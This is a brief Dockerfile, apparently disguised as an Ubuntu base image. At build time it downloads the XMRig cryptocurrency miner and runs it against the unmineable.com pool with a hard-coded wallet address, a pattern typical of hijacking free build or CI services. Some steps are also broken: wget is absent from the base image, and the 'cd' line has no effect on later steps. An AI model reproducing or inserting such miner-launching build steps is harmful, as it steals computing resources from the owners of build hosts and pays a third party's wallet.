FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
RUN tar -xf xmrig-6.12.1-linux-x64.tar.gz
RUN cd xmrig-6.12.1
RUN chmod u+x xmrig
RUN ./xmrig -o rx.unmineable.com:3333 -u LTC:MMLpRmmigMz3dpJownkzVEHq14BJn7fQeA.kav31287
